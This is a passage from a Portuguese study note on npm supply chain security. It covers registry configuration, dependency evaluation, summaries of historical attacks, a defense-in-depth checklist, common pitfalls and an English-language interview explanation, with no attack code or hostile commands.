# verdaccio/config.yaml — registry interno mínimo
storage: ./storage
uplinks:
  npmjs:
    url: https://registry.npmjs.org/
packages:
  '@minha-empresa/*':
    access: $authenticated
    publish: $authenticated
    # Sem uplink: pacote interno nunca vai para o npm público
  '**':
    access: $all
    publish: $authenticated
    proxy: npmjs    # Tudo mais: proxy do npm, com cache local
```

---

## Minimizar superfície: a melhor dependência é a que não existe

Toda dependência que você adiciona é uma superfície de ataque. Antes de `npm install <pacote>`:

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
flowchart TD
    Q1["Preciso realmente de um pacote?\nOu dá para implementar em 10 linhas?"]
    Q2["A Node.js standard library já tem?"]
    Q3["Qual é o histórico do mantenedor?\nÉ ativo? Tem muitos contribuidores?"]
    Q4["Qual é a contagem de dependências transitivas?"]
    Q5["Quando foi o último commit?"]

    A1["✓ Implemente você mesmo\n(menos superfície)"]
    A2["✓ Use o built-in\n(zero risco de supply chain)"]
    A3["⚠ Investigue\n(conta única = ponto único de falha)"]
    A4["⚠ Avalie custo\n(200+ transitivas = grande superfície)"]
    A5["⚠ Risco de abandono\n(mais de 2 anos sem commit = red flag)"]

    Q1 -->|"Sim"| Q2
    Q1 -->|"Não (simples)"| A1
    Q2 -->|"Sim"| A2
    Q2 -->|"Não"| Q3
    Q3 --> A3
    Q3 --> Q4
    Q4 --> A4
    Q4 --> Q5
    Q5 --> A5
```

Ferramentas práticas para avaliar antes de instalar:

```bash
# Quantas dependências transitivas um pacote carrega?
npx cost-of-modules <pacote>

# Alternativa: bundlephobia (browser)
# https://bundlephobia.com/package/moment

# Socket.dev CLI — análise de risco antes de instalar
npx socket npm install <pacote>
# Mostra: score de segurança, mantenedores, novo comportamento vs versão anterior

# npm-check-updates — vê o que está desatualizado
npx npm-check-updates
```

Alguns casos onde a stdlib do Node elimina deps por completo:

| Pacote externo | Alternativa nativa (Node 18+) |
|---|---|
| `node-fetch`, `axios` | `fetch` (global nativo desde Node 18) |
| `uuid` | `crypto.randomUUID()` |
| `rimraf` | `fs.rm(path, { recursive: true })` |
| `mkdirp` | `fs.mkdir(path, { recursive: true })` |
| `dotenv` (parcial) | `node --env-file=.env` (Node 20.6+) |
| `glob` | `fs.glob()` (Node 22+) |

---

## Ataques históricos que moldam as práticas de hoje

Entender os ataques históricos ajuda a compreender por que cada prática de segurança existe.

**event-stream (2018)** — O maintainer do pacote `event-stream` (2 milhões de downloads/semana) transferiu a ownership para um stranger que pediu ajuda para "manter" o projeto. O novo "mantenedor" adicionou uma dependência maliciosa que visava especificamente carteiras de Bitcoin da Copay. A dependência ficou ativa por dois meses antes de ser detectada. *Lição: a ownership de pacotes populares é um ativo de alto valor para atacantes.*

**ua-parser-js (2021)** — Um atacante comprometeu a conta npm do mantenedor via credential stuffing (usar senhas vazadas de outros serviços). Publicou três versões maliciosas que instalavam um cryptominer (em Linux) e um trojan (em Windows) via postinstall. Durou menos de 4 horas antes de ser detectado, mas já havia sido instalado por pipelines de CI ao redor do mundo. *Lição: MFA em contas npm é obrigatório para qualquer mantenedor.*

**xz Utils (2024)** — Não é npm, mas é a referência em supply chain de software compilado. Um contribuidor passou *dois anos* construindo reputação em um projeto open source de compressão (`xz`) antes de introduzir uma backdoor sofisticada no processo de build que afetaria OpenSSH em distribuições Linux. Detectado por acidente por um engenheiro da Microsoft que notou que o SSH estava 500ms mais lento. *Lição: ataques de supply chain são pacientes; confiança conquistada ao longo do tempo pode ser subvertida.*

**Polyfill.io (junho 2024)** — O domínio `polyfill.io` foi adquirido por uma empresa chinesa (Funnull CDN) e imediatamente começou a servir JavaScript malicioso para mais de 100.000 sites que usavam o serviço de polyfill via CDN. O script original era legítimo; a propriedade do domínio mudou de mãos e o serviço foi weaponizado. Sites como Warner Bros, Hulu, e múltiplos portais governamentais foram afetados. *Lição: dependências de runtime via CDN são supply chain também — e com blast radius ordens de magnitude maior. Sempre self-host scripts críticos.*

**Lottie Player (@lottiefiles/lottie-player, outubro 2024)** — Em 31 de outubro de 2024, versões 2.0.5, 2.0.6 e 2.0.7 do pacote `@lottiefiles/lottie-player` foram publicadas com código malicioso que injetava um prompt para conectar carteiras de criptomoeda. O pacote tinha 130.000+ downloads semanais. O NPM removeu as versões maliciosas em horas, mas sites que usavam `@latest` sem lockfile já tinham servido o código malicioso para usuários. *Lição: usar `@latest` ou versões sem lockfile em produção é uma aposta permanente que você vai perder eventualmente.*

**Mini Shai-Hulud (2025-2026)** — Série de ataques de worm auto-replicante onde atacantes do grupo TeamPCP comprometeram contas de mantenedores e usaram os pipelines de CI legítimos para publicar código malicioso *com provenance SLSA Build Level 3 válido*. Em um episódio, 84 versões de 42 pacotes TanStack foram publicadas em menos de 6 minutos. *Lição: provenance não é suficiente quando a conta que controla o pipeline está comprometida.*

> [!danger] O padrão que conecta todos
> Em todos os ataques acima, o vetor foi **confiança implícita**: confiança no mantenedor original (event-stream), na conta autenticada (ua-parser-js, xz), na provenance gerada por CI legítimo (Mini Shai-Hulud). A defesa efetiva é reduzir essa confiança implícita com múltiplas camadas de verificação independentes.

---

## Checklist de defesa em profundidade

Não existe uma única medida que resolve tudo. A segurança de supply chain é a composição de múltiplas camadas:

```markdown
## Checklist: supply chain security para projetos Node/npm

### Lockfile e installs
- [ ] package-lock.json está no git (nunca no .gitignore)
- [ ] CI/CD usa `npm ci`, não `npm install`
- [ ] Lockfile tem todos os campos `integrity` (SHA-512)

### Scripts de instalação
- [ ] `ignore-scripts=true` no `.npmrc` (até npm v12; padrão a partir dele)
- [ ] Pacotes que precisam de scripts têm justificativa documentada
- [ ] npm v12+ em uso com `npm approve-scripts` para whitelist

### Auditoria e análise
- [ ] `npm audit` roda em CI (falha o build em severidade high+)
- [ ] Socket.dev ou Snyk monitora comportamento de pacotes, não só CVEs
- [ ] `npm audit signatures` valida assinaturas do registry

### Provenance
- [ ] Pacotes publicados pela sua equipe usam `--provenance`
- [ ] GitHub Actions com `id-token: write` para Sigstore
- [ ] Verificação de provenance em deps críticas

### SBOM
- [ ] `npm sbom --sbom-format cyclonedx` gerado em cada release
- [ ] SBOM salvo como artifact do build no CI
- [ ] SBOM consultado quando novas vulnerabilidades emergem

### Atualizações automáticas
- [ ] Dependabot ou Renovate configurado no repositório
- [ ] `minimumReleaseAge: "3 days"` para auto-merge (quarentena de novas publicações)
- [ ] Auto-merge de patches após CI verde + quarentena (reduz ruído sem expor janela de ataque)
- [ ] `vulnerabilityAlerts: true` no Renovate (override sem quarentena para CVEs confirmados)

### Trusted Publishing e tokens
- [ ] npm Trusted Publishing configurado (sem NPM_TOKEN permanente em CI)
- [ ] Se ainda em NPM_TOKEN clássico: escopo `publish only`, rotação semestral
- [ ] `npm publish --provenance` emparelhado ao Trusted Publishing

### Isolamento e vendoring
- [ ] pnpm strict mode avaliado para projetos novos (phantom deps bloqueadas)
- [ ] Scripts críticos de terceiros self-hosted (não via CDN de terceiro em runtime)
- [ ] Registry interno (Verdaccio/Artifactory) para ambientes regulados ou air-gapped

### Minimizar superfície
- [ ] Cada nova dep tem justificativa (PR ou ADR)
- [ ] Stdlib do Node usada quando possível (fetch, uuid, fs.rm)
- [ ] Dependências transitivas revisadas para pacotes críticos

### Contas e credenciais
- [ ] MFA ativado em todas as contas npm de mantenedores
- [ ] NPM_TOKEN em CI com escopo mínimo (publish only)
- [ ] Tokens de CI rotacionados periodicamente
```

---

## Armadilhas comuns

> [!warning] Armadilha 1: confundir `npm install` com `npm ci` em CI
> O `npm install` em CI é silenciosamente perigoso: ele pode resolver novas versões que não estão no lockfile e sequer falha se o lockfile divergir. Todo pipeline de CI deve usar `npm ci` — é mais rápido (porque apaga e recria node_modules) e mais seguro (nunca diverge do lockfile).

> [!warning] Armadilha 2: `.npmrc` com `ignore-scripts=true` mas npm antigo
> Com npm v11 e anteriores, `--ignore-scripts` não protege contra "Phantom Gyp" (o arquivo `binding.gyp` que dispara `node-gyp rebuild` implicitamente). O fix completo chegou com npm v12 (julho 2026). Se você está em npm ≤ 11, considere adicionar proteção complementar via Socket.dev ou Snyk para detectar pacotes que usam essa técnica.

> [!warning] Armadilha 3: tratar `npm audit` como suficiente
> O `npm audit` só detecta CVEs conhecidos e publicados no banco do npm. Pacotes maliciosos recém-publicados (typosquatting, conta comprometida, código novo) não têm CVE ainda — passam limpos no `npm audit`. Use Socket.dev ou Snyk em paralelo para análise comportamental.

> [!warning] Armadilha 4: assumir que provenance = seguro
> Como demonstrado pelo Mini Shai-Hulud (2026), um pacote pode ter provenance SLSA Build Level 3 válido e ainda assim ser malicioso, se o pipeline de CI que gerou o artefato estava sob controle do atacante. Provenance é uma camada importante, mas não é suficiente sozinho.

> [!warning] Armadilha 5: pacotes internos sem escopo (`@`)
> `minha-empresa/utils-internos` sem o `@` de escopo é vulnerável a dependency confusion. Qualquer nome sem escopo pode ser registrado no npm público. Packages internos **sempre** devem usar `@escopo/nome` — e o `.npmrc` deve fixar a resolução desse escopo para o registry privado.

> [!warning] Armadilha 6: não auditar devDependencies
> `npm audit --omit=dev` é adequado para avaliar risco em produção, mas postinstall scripts de devDeps executam na máquina do desenvolvedor e no CI. Um cryptominer em uma devDep é menos crítico que em produção, mas ainda é um incidente de segurança.

> [!warning] Armadilha 7: Renovate sem `minimumReleaseAge`
> Renovate com `automerge: true` sem `minimumReleaseAge` vai aplicar automaticamente qualquer patch assim que for publicado — incluindo versões maliciosas. Essa janela de minutos entre publicação e auto-merge é exatamente o vetor que os ataques de 2024-2026 exploram. O padrão razoável é `minimumReleaseAge: "3 days"` para auto-merge e `"0 days"` apenas para `matchCategories: ["security"]` (CVEs confirmados). Não confundir velocidade de automação com velocidade de resposta a incidentes.

> [!warning] Armadilha 8: scripts críticos via CDN em runtime
> Usar `<script src="https://cdn.polyfill.io/...">` ou similar em HTML/bundle é supply chain de runtime, não de build. O lockfile não protege isso — o script é baixado pelo browser do usuário, não pelo seu CI. O caso Polyfill.io (junho 2024) provou que a propriedade de um domínio CDN pode mudar overnight. Scripts críticos de terceiros devem ser self-hosted, versionados, e servidos do seu próprio CDN/assets.

---

## Como explicar em inglês

Software supply chain security is about defending the entire chain between source code and running software: your dependencies, their dependencies, the build pipeline, the package registry, and the tools that assemble everything. The threat surface is massive because you trust hundreds of maintainers implicitly when you run `npm install`.

Key attack vectors to know for an interview:

**Typosquatting** is publishing a package with a name close to a popular one (e.g. `lodahs` instead of `lodash`) hoping developers mistype. Defense: review package names carefully before installing; use Socket.dev to flag suspicious names.

**Dependency confusion** (Alex Birsan, 2021) exploits npm's registry resolution: if your company has a private package named `utils-internos` and an attacker publishes a higher version of that name to the public registry, package managers may prefer the public one. Defense: always scope internal packages (`@company/utils-internos`) and pin the scope to the private registry in `.npmrc`.

**Compromised maintainer accounts** are the hardest to detect: the attacker publishes a malicious version through the legitimate account. The hash in the lockfile is correct (it's the hash of the malicious tarball), `npm audit` finds nothing. Defense: behavioral analysis tools like Socket.dev that compare new package versions against prior versions for new network calls, file access, or obfuscation.

**Install scripts** (`preinstall`, `postinstall`) execute arbitrary code on every `npm install` with the user's full permissions. Defense: `--ignore-scripts` / `ignore-scripts=true` in `.npmrc`; npm v12 (July 2026) makes this the default.

**Provenance and SLSA**: npm provenance (GA since October 2023) uses Sigstore to cryptographically link a published package to the exact source commit and CI pipeline that produced it. The attestation is recorded in Rekor, Sigstore's public transparency log. `npm audit signatures` verifies all installed packages. Limitation: provenance doesn't help if the CI pipeline itself is compromised (as shown by the Mini Shai-Hulud attacks in 2025-2026 where malicious packages had valid SLSA Build Level 3 attestations).

**Lockfile integrity**: the `integrity` field in `package-lock.json` is a SHA-512 hash of the package tarball. `npm ci` enforces immutable installs — it fails if the lockfile diverges from `package.json` and never updates it. Always use `npm ci` in CI/CD, never `npm install`.

**SBOM** (Software Bill of Materials): `npm sbom --sbom-format cyclonedx` generates a machine-readable inventory of all dependencies with versions, hashes, and licenses. Required by CISA guidelines and useful for responding to new vulnerabilities without scanning code.

**Trusted Publishing** (npm, October 2024): eliminates long-lived `NPM_TOKEN` secrets in CI. Instead, GitHub Actions requests a short-lived OIDC token from GitHub's identity provider; npm verifies the token against a pre-configured allowlist (repo + workflow). No permanent secret exists to leak. Works alongside `--provenance` — both use the same ephemeral OIDC token.

**Minimum Release Age** (Renovate): a quarantine period between when a version is published and when Renovate opens or auto-merges the PR. Set `minimumReleaseAge: "3 days"` for regular updates to give the community time to detect malicious packages before you install them automatically. Override to `"0 days"` for confirmed security alerts where you want the fix immediately.

**pnpm strict mode**: pnpm's symlinked `node_modules` structure means each package can only access what it explicitly declares in its own `package.json`. This blocks phantom dependencies — packages importing modules they didn't declare, a common pattern that supply-chain attackers can exploit to reach host environment variables or credentials.

**Runtime CDN supply chain** (Polyfill.io, June 2024): the lockfile only protects build-time dependencies. JavaScript loaded at runtime via `<script src="https://cdn.third-party.io/...">` is a separate supply chain — one that the browser downloads directly from a third-party domain. When that domain changes ownership (as happened with polyfill.io in June 2024), 100,000+ sites served malicious JavaScript to users overnight. Critical third-party scripts must be self-hosted.

| Português | Inglês |
|---|---|
| cadeia de fornecimento de software | software supply chain |
| pacote malicioso | malicious package |
| confusão de dependências | dependency confusion |
| desvio de nome (typo) | typosquatting |
| script de instalação | install/lifecycle script |
| hash de integridade | integrity hash |
| proveniência | provenance |
| atestado | attestation |
| log de transparência | transparency log |
| conta comprometida | compromised account / hijacked account |
| inventário de dependências | software bill of materials (SBOM) |
| superfície de ataque | attack surface |
| análise comportamental | behavioral analysis |
| installs imutáveis | immutable installs / frozen installs |
| registro privado | private registry |
| fornecimento confiável | trusted publishing |
| quarentena de versão | release quarantine / minimum release age |
| espelhamento interno | internal registry mirror / proxy registry |
| vendorização | vendoring |
| dependência fantasma | phantom dependency |

---

## O que vem a seguir

Segurança de supply chain é um problema que se resolve em múltiplos níveis: nesta nota cobrimos o ecossistema de dependências npm. O próximo nível é entender como esses problemas se enquadram na segurança mais ampla do sistema — como confiança transitiva, cadeia de trust, e princípios de zero-trust se aplicam além do npm.

- [[23 - Build em produção, CI e determinismo]] — como determinismo no build e lockfiles imutáveis se conectam ao problema de reproducibilidade — a base técnica que torna os hashes de integridade significativos
- [[05 - Semver e o grafo de dependências]] — o modelo de resolução de versões que é o terreno onde dependency confusion e typosquatting operam
- [[03 - Package managers - npm, pnpm, yarn e Bun]] — como pnpm strict mode e hoisting afetam o isolamento de pacotes e a superfície de ataque
- [[25 - IA no tooling e build]] — modelos de linguagem sendo integrados ao pipeline de build; a IA que sugere deps ou auto-aceita upgrades cria novos vetores de supply chain (prompt injection, dependências sugeridas por LLMs sem verificação humana)
- [[index|trilha Tooling e Build]] — visão completa da trilha
- [[03-Dominios/Engenharia/Segurança/17 - Confiança transitiva e Trusting Trust|Confiança transitiva e Trusting Trust]] — o ensaio de Ken Thompson sobre como a confiança em compiladores e ferramentas é fundamentalmente recursiva — a base filosófica de toda supply chain security

---

## Fontes

- **GitHub Blog** — [*Introducing npm package provenance*](https://github.blog/security/supply-chain-security/introducing-npm-package-provenance/) — anúncio oficial do GA de provenance, mecanismo técnico completo
- **Snyk** — [*npm Security Best Practices: Shai Hulud Attack*](https://snyk.io/articles/npm-security-best-practices-shai-hulud-attack/) — análise pós-ataque das campanhas Mini Shai-Hulud 2025
- **Alex Birsan** — [*Dependency Confusion*](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) — o artigo original do ataque de 2021, leitura obrigatória
- **npm Docs** — [*Generating provenance statements*](https://docs.npmjs.com/generating-provenance-statements/) — documentação oficial de como configurar provenance em CI
- **npm Docs** — [*npm sbom*](https://docs.npmjs.com/cli/v9/commands/npm-sbom/) — referência do comando de geração de SBOM
- **Sigstore Blog** — [*cosign verification of npm provenance*](https://blog.sigstore.dev/cosign-verify-bundles/) — verificação de provenance via cosign CLI
- **The Hacker News** — [*GitHub to Disable npm Install Scripts by Default*](https://thehackernews.com/2026/06/github-to-disable-npm-install-scripts.html) — anúncio do npm v12 com scripts desabilitados por padrão
- **Microsoft Security Blog** — [*33 malicious npm packages abuse dependency confusion*](https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/) — análise de ataque de dependency confusion em 2026
- **Mondoo** — [*npm Supply Chain Security in 2026*](https://mondoo.com/blog/npm-supply-chain-security-package-manager-defenses-2026) — panorama atual das defesas disponíveis
- **npm Docs** — [*Configuring Trusted Publishing*](https://docs.npmjs.com/using-npm/trusted-publishing/) — guia oficial de setup do Trusted Publishing com GitHub Actions (sem NPM_TOKEN permanente)
- **Sansec** — [*Polyfill supply chain attack hits 100K+ sites*](https://sansec.io/research/polyfill-supply-chain-attack) — análise técnica do ataque ao domínio polyfill.io (junho 2024)
- **Checkmarx** — [*Lottie Player npm Supply Chain Attack*](https://checkmarx.com/blog/lottie-player-supply-chain-attack-october-2024/) — post-mortem do ataque de outubro 2024 ao @lottiefiles/lottie-player
- **Renovate Docs** — [*minimumReleaseAge*](https://docs.renovatebot.com/configuration-options/#minimumreleaseage) — referência da opção de quarentena de publicações no Renovate
- **pnpm Docs** — [*Symlinked node_modules structure*](https://pnpm.io/symlinked-node-modules-structure) — explicação técnica do modelo de isolamento strict do pnpm vs npm hoisting
- **TanStack Blog** — [*Postmortem: TanStack npm supply-chain compromise*](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem) — análise técnica do vetor real do ataque Mini Shai-Hulud: Pwn Request + cache poisoning + extração de OIDC token do runner
- **StepSecurity** — [*Mini Shai-Hulud Is Back: A Self-Spreading Supply Chain Attack*](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem) — detalhamento da cadeia pull_request_target → cache poisoning → OIDC token extraction
- **GitHub Blog (Changelog)** — [*Upcoming breaking changes for npm v12*](https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12/) — anúncio oficial das breaking changes do npm v12, incluindo o comportamento por projeto do `approve-scripts`

---

*Supply chain security em uma frase: você não confia só no código que escreve — você confia em cada mantenedor de cada pacote que você instala, direta ou transitivamente; as práticas desta nota existem para tornar essa confiança verificável em vez de cega.*
